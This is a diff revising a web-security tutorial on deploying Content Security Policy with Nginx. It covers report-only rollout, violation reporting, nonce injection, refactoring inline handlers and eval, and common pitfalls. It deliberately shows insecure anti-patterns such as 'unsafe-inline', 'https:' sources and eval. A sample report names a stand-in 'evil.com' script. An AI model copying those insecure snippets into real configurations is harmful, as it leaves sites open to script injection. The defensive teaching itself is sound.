   <li data-check="warning">**Third-party scripts** → Verify `'strict-dynamic'` covers them</li>
+  <li data-check="warning">**Inline styles in JS** → Use CSS classes or CSS custom properties</li>
 </CheckList>
 
-### Phase 3: Enable enforcement
+### Phase 3: Enforce
 
-Once violations are minimal:
-
-<Code lang="nginx" aria-label="Enforcement mode">
+<Code lang="nginx" title="Enforcement mode">
 ```nginx
 # Now blocking violations
 add_header Content-Security-Policy "..." always;
 
 # Optional: keep report-only for testing stricter future policies
-add_header Content-Security-Policy-Report-Only "...stricter-policy..." always;
+add_header Content-Security-Policy-Report-Only "...even-stricter-policy..." always;
 ```
 </Code>
 
 ---
 
-## Setting up CSP reporting
+## Setting Up CSP Reporting
 
-One of CSP's most powerful features is its built-in reporting mechanism. When a browser blocks a resource due to CSP, it can automatically send a detailed report to an endpoint you specify. This creates a feedback loop that serves multiple purposes:
-
-- **Detect real attacks**: If someone tries to inject scripts into your site, you'll know immediately
-- **Find policy bugs**: Discover if your CSP is blocking legitimate resources before users complain
-- **Monitor third-party scripts**: Track when analytics or ad scripts load unexpected dependencies
-- **Audit compliance**: Maintain a log of security events for compliance requirements
-
-Reports contain rich information including the violated directive, the blocked URL, the page where it occurred, and even a sample of the offending code. This makes them invaluable for both development and security monitoring.
+CSP's built-in reporting tells you when violations occur—essential for debugging and detecting attacks.
 
 <StateNotice
   type="deprecated"
@@ -1152,16 +1343,14 @@ Reports contain rich information including the violated directive, the blocked U
 />
 
 <Callout type="info">
-  **For maximum browser compatibility, use both `report-uri` and `report-to`:**
-  - Chrome 70+ uses `report-to` and ignores `report-uri` when both are present
-  - Firefox and Safari still rely on `report-uri`
+  **For maximum compatibility, use both:** Chrome 70+ uses `report-to` and ignores `report-uri`. Firefox and Safari still rely on `report-uri`.
 </Callout>
 
-### Option 1: Simple Nginx logging (legacy + modern)
+### Option 1: Simple Nginx Logging
 
 <FileContent filename="/etc/nginx/sites-available/example.com" icon="devicon:nginx">
 ```nginx
-# Reporting endpoint for CSP violations
+# Reporting endpoint
 location /csp-reports {
     access_log /var/log/nginx/csp-reports.log;
     return 204;
@@ -1169,11 +1358,9 @@ location /csp-reports {
 ```
 </FileContent>
 
-Configure both `report-uri` and `report-to` in your CSP:
-
-<FileContent filename="/etc/nginx/snippets/security_headers.conf" icon="devicon:nginx">
+<FileContent filename="CSP Header with reporting" icon="devicon:nginx">
 ```nginx
-# Modern Reporting API endpoint (CSP Level 3)
+# Modern Reporting API (Chrome 70+)
 add_header Reporting-Endpoints 'csp-endpoint="/csp-reports"' always;
 
 # CSP with both legacy and modern reporting
@@ -1187,18 +1374,18 @@ add_header Content-Security-Policy "
 ```
 </FileContent>
 
-### Option 2: Third-party service
+### Option 2: Third-Party Services
 
 Services like [Report URI](https://report-uri.com/) provide dashboards and analysis:
 
-<Code lang="nginx" aria-label="Third-party reporting">
+<Code lang="nginx" title="Third-party reporting">
 ```nginx
 report-uri https://your-subdomain.report-uri.com/r/d/csp/enforce;
 report-to csp-endpoint;
 ```
 </Code>
 
-### Violation report format
+### Violation Report Format
 
 Browsers send JSON reports like this:
 
@@ -1207,11 +1394,16 @@ Browsers send JSON reports like this:
 {
   "csp-report": {
     "document-uri": "https://example.com/page",
+    "blocked-uri": "https://evil.com/script.js",
     "violated-directive": "script-src-elem",
-    "blocked-uri": "inline",
+    "effective-directive": "script-src-elem",
+    "original-policy": "script-src 'nonce-abc123' 'strict-dynamic'",
+    "disposition": "enforce",
+    "status-code": 200,
+    "script-sample": "",
     "line-number": 42,
-    "source-file": "https://example.com/page",
-    "script-sample": "alert('blocked!')"
+    "column-number": 15,
+    "source-file": "https://example.com/page"
   }
 }
 ```
@@ -1219,32 +1411,38 @@ Browsers send JSON reports like this:
 
 ---
 
-## Refactoring code for CSP
+## Refactoring Code for CSP
 
 Some common patterns are incompatible with strict CSP. Here's how to fix them:
 
-### Inline event handlers → addEventListener
+### Inline Event Handlers → addEventListener
 
 <CompareCode badTitle="Blocked by CSP" goodTitle="CSP-Compatible">
   <div slot="bad">
     ```html
     <button onclick="submitForm()">Submit</button>
     <a href="javascript:doSomething()">Click</a>
+    <form onsubmit="validate()">...</form>
     ```
   </div>
   <div slot="good">
     ```html
     <button id="submitBtn">Submit</button>
     <a href="#" id="actionLink">Click</a>
+    <form id="myForm">...</form>
     
     <script nonce="CSP_NONCE_NGINX">
       document.getElementById('submitBtn')
         .addEventListener('click', submitForm);
+      
       document.getElementById('actionLink')
         .addEventListener('click', (e) => {
           e.preventDefault();
           doSomething();
         });
+      
+      document.getElementById('myForm')
+        .addEventListener('submit', validate);
     </script>
     ```
   </div>
@@ -1255,33 +1453,62 @@ Some common patterns are incompatible with strict CSP. Here's how to fix them:
 <CompareCode badTitle="Uses eval() - Blocked" goodTitle="Uses JSON.parse() - Allowed">
   <div slot="bad">
     ```javascript
+    // Dangerous - blocked by CSP
     const data = eval('(' + jsonString + ')');
     setTimeout('doSomething()', 1000);
+    const fn = new Function('x', 'return x * 2');
     ```
   </div>
   <div slot="good">
     ```javascript
+    // Safe - works with strict CSP
     const data = JSON.parse(jsonString);
     setTimeout(doSomething, 1000);
+    const fn = (x) => x * 2;
+    ```
+  </div>
+</CompareCode>
+
+### Inline Styles in JS → CSS Custom Properties
+
+<CompareCode badTitle="Dynamic inline styles" goodTitle="CSS Custom Properties">
+  <div slot="bad">
+    ```javascript
+    // May be blocked depending on style-src
+    element.style.backgroundColor = userColor;
+    element.setAttribute('style', 'color:' + color);
+    ```
+  </div>
+  <div slot="good">
+    ```javascript
+    // Works with strict CSP
+    element.style.setProperty('--user-color', userColor);
+    element.classList.add('highlighted');
+    ```
+    ```css
+    .highlighted {
+      background: var(--user-color, #fff);
+    }
     ```
   </div>
 </CompareCode>
 
 ---
 
-## Testing and validation
+## Testing and Validation
 
 ### Browser DevTools
 
 Your best friend for CSP debugging. Open F12 → Console to see violations in real-time:
 
-<TerminalOutput title="CSP Violation in Browser Console">
+<TerminalOutput title="CSP Violation in Chrome Console">
 Refused to execute inline script because it violates the following Content 
 Security Policy directive: "script-src 'nonce-abc123' 'strict-dynamic'". 
-Either the 'unsafe-inline' keyword, a hash, or a nonce is required.
+Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce 
+('nonce-...') is required to enable inline execution.
 </TerminalOutput>
 
-### Online tools
+### Online Tools
 
 <Table title="CSP Testing Tools">
   <thead>
@@ -1297,7 +1524,7 @@ Either the 'unsafe-inline' keyword, a hash, or a nonce is required.
     </tr>
     <tr>
       <td><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener noreferrer"><strong>Google CSP Evaluator</strong></a></td>
-      <td>Finds logical bypasses in your policy</td>
+      <td>Finds logical bypasses in your policy (highly recommended)</td>
     </tr>
     <tr>
       <td><a href="https://securityheaders.com/" target="_blank" rel="noopener noreferrer"><strong>SecurityHeaders.com</strong></a></td>
@@ -1312,45 +1539,49 @@ Either the 'unsafe-inline' keyword, a hash, or a nonce is required.
 
 ---
 
-## Common pitfalls
+## Common Pitfalls
 
-### 1. Using `'unsafe-inline'` for scripts
+### 1. Using `'unsafe-inline'` for Scripts
 
 <CompareCode badTitle="Defeats CSP protection" goodTitle="Use nonces instead">
   <div slot="bad">
     ```nginx
+    # Your CSP is now useless for XSS protection
     script-src 'self' 'unsafe-inline';
     ```
   </div>
   <div slot="good">
     ```nginx
+    # Actual protection
     script-src 'self' 'nonce-$cspNonce';
     ```
   </div>
 </CompareCode>
 
-### 2. Allowing `https:` as a source
+### 2. Overly Permissive Sources
 
-<Code lang="nginx" aria-label="Overly permissive source">
+<Code lang="nginx" title="DON'T: Trusting entire schemes">
 ```nginx
 # DANGER: Trusts the entire internet!
 script-src 'self' https:;
+img-src *;
 ```
 </Code>
 
-This allows any script from any HTTPS domain to execute, completely defeating CSP's purpose.
+This allows any HTTPS script to execute, completely defeating CSP's purpose.
 
-### 3. Forgetting `object-src` and `base-uri`
+### 3. Forgetting Required Directives
 
-<CompareCode badTitle="Incomplete protection" goodTitle="Complete strict CSP">
+<CompareCode badTitle="Incomplete - Bypassable" goodTitle="Complete Strict CSP">
   <div slot="bad">
     ```nginx
+    # Missing critical directives!
     script-src 'nonce-$cspNonce';
-    # Missing object-src and base-uri!
     ```
   </div>
   <div slot="good">
     ```nginx
+    # All required directives present
     script-src 'nonce-$cspNonce' 'strict-dynamic';
     object-src 'none';
     base-uri 'none';
@@ -1360,14 +1591,16 @@ This allows any script from any HTTPS domain to execute, completely defeating CS
 
 ### 4. Missing `always` in Nginx
 
-<CompareCode badTitle="Only 2xx responses" goodTitle="All responses (including errors)">
+<CompareCode badTitle="Only 2xx responses" goodTitle="All responses including errors">
   <div slot="bad">
     ```nginx
+    # CSP missing on 404, 500 pages!
     add_header Content-Security-Policy "...";
     ```
   </div>
   <div slot="good">
     ```nginx
+    # CSP on ALL responses
     add_header Content-Security-Policy "..." always;
     ```
   </div>
@@ -1375,11 +1608,9 @@ This allows any script from any HTTPS domain to execute, completely defeating CS
 
 Without `always`, CSP headers won't be sent on error pages (404, 500), leaving those pages vulnerable.
 
-### 5. `add_header` inheritance gotcha
+### 5. `add_header` Inheritance Gotcha
 
-When you use `add_header` in a nested location block, it **replaces all parent headers**:
-
-<Code lang="nginx" aria-label="Header inheritance problem">
+<Code lang="nginx" title="Headers get overwritten in nested locations">
 ```nginx
 location / {
     add_header Content-Security-Policy "..." always;
@@ -1394,13 +1625,11 @@ location /assets/ {
 ```
 </Code>
 
-**Solution:** Use `include` to share headers across locations, or repeat all headers in nested blocks.
+**Solution:** Use `include` snippets to share headers across locations.
 
 ---
 
-## Complete production example
-
-Here's a production-ready Nginx configuration with CSP:
+## Complete Production Example
 
 <FileContent filename="/etc/nginx/sites-available/example.com" icon="devicon:nginx">
 ```nginx
@@ -1413,19 +1642,24 @@ server {
     root /var/www/example.com;
     index index.html;
     
-    # CSP nonce setup
+    # ================================================
+    # CSP Nonce Setup
+    # ================================================
     set $cspNonce $request_id;
     sub_filter_once off;
     sub_filter_types text/html text/css application/javascript;
     sub_filter CSP_NONCE_NGINX $cspNonce;
     
-    # Build CSP header
+    # ================================================
+    # Build CSP Header
+    # ================================================
     set $csp "default-src 'none'; ";
     set $csp "${csp}script-src 'self' 'nonce-${cspNonce}' 'strict-dynamic'; ";
     set $csp "${csp}style-src 'self' 'unsafe-inline'; ";
     set $csp "${csp}img-src 'self' data:; ";
     set $csp "${csp}font-src 'self'; ";
     set $csp "${csp}connect-src 'self'; ";
+    set $csp "${csp}worker-src 'self'; ";
     set $csp "${csp}object-src 'none'; ";
     set $csp "${csp}base-uri 'none'; ";
     set $csp "${csp}frame-ancestors 'none'; ";
@@ -1434,21 +1668,38 @@ server {
     set $csp "${csp}report-uri /csp-reports; ";
     set $csp "${csp}report-to csp-endpoint";
     
-    # Reporting API endpoint (for modern browsers)
+    # ================================================
+    # Security Headers
+    # ================================================
     add_header Reporting-Endpoints 'csp-endpoint="/csp-reports"' always;
     add_header Content-Security-Policy $csp always;
     add_header X-Content-Type-Options "nosniff" always;
     add_header X-Frame-Options "DENY" always;
     add_header Referrer-Policy "strict-origin-when-cross-origin" always;
-    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
+    add_header Cross-Origin-Opener-Policy "same-origin" always;
+    add_header Cross-Origin-Embedder-Policy "require-corp" always;
+    add_header Cross-Origin-Resource-Policy "same-origin" always;
     
+    # ================================================
+    # Routes
+    # ================================================
     location / {
         try_files $uri $uri/ =404;
     }
     
+    # CSP Violation Reporting Endpoint
     location /csp-reports {
         access_log /var/log/nginx/csp-reports.log;
         return 204;
+    }
+    
+    # Static assets with relaxed CORP for social media
+    location /assets/ {
+        expires 1y;
+        add_header Cache-Control "public, immutable" always;
+        add_header Cross-Origin-Resource-Policy "cross-origin" always;
     }
 }
 ```
@@ -1456,18 +1707,21 @@ server {
 
 ---
 
-## Summary: your CSP journey
+## Your CSP Journey: Summary
 
-1. **Start simple**: `default-src 'self'`
-2. **Add directives progressively**: scripts, styles, images, etc.
-3. **Handle inline scripts**: Move to files, use hashes, or use nonces
-4. **For static sites**: Use Nginx `sub_filter` for nonce injection
-5. **Go strict**: Add `'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'`
-6. **Deploy safely**: Start with report-only mode
-7. **Monitor**: Set up reporting to catch violations
+<StepByStep title="CSP Implementation Roadmap">
+  <li>**Start simple** — Deploy `default-src 'self'` in report-only mode</li>
+  <li>**Add directives progressively** — Scripts, styles, images, etc.</li>
+  <li>**Handle inline scripts** — Move to files, use hashes, or implement nonces</li>
+  <li>**For static sites** — Use Nginx `sub_filter` for nonce injection</li>
+  <li>**Go strict** — Add `'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'`</li>
+  <li>**Set up reporting** — Monitor violations with `report-uri` / `report-to`</li>
+  <li>**Enforce gradually** — Switch from report-only to enforcement after testing</li>
+  <li>**Maintain and iterate** — Keep monitoring, update as your app evolves</li>
+</StepByStep>
 
 <Callout type="success" icon="mdi:trophy">
-  **Result:** Following this guide, you can achieve an A+ rating on [Mozilla Observatory](https://observatory.mozilla.org/) while maintaining full site functionality.
+  **Result:** Following this guide, you can achieve an A+ rating on [Mozilla Observatory](https://observatory.mozilla.org/) while maintaining full site functionality and protecting your users from XSS attacks.
 </Callout>
 
 ---
@@ -1475,15 +1729,20 @@ server {
 ## Resources
 
 ### Official Documentation
-- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
-- [W3C CSP Level 3 Specification](https://www.w3.org/TR/CSP3/)
-- [Google web.dev: Strict CSP](https://web.dev/articles/strict-csp)
 
-### Best Practices
+- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — Comprehensive reference
+- [W3C CSP Level 3 Specification](https://www.w3.org/TR/CSP3/) — The official spec
+- [Google web.dev: Strict CSP](https://web.dev/articles/strict-csp) — Google's recommended approach
+
+### Research & Best Practices
+
 - [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
-- [CSP Is Dead, Long Live Strict CSP](https://research.google.com/pubs/pub45542.html) — Google's research
+- [CSP Is Dead, Long Live Strict CSP](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/) — Google's seminal 2016 research
+- [Trusted Types for DOM XSS Prevention](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
 
 ### Tools
-- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
-- [Report URI](https://report-uri.com/)
-- [content-security-policy.com](https://content-security-policy.com/)
+
+- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) — Find bypasses in your policy
+- [Report URI](https://report-uri.com/) — CSP reporting service with dashboards
+- [Mozilla Observatory](https://observatory.mozilla.org/) — Complete security header analysis
+- [content-security-policy.com](https://content-security-policy.com/) — Reference and examples
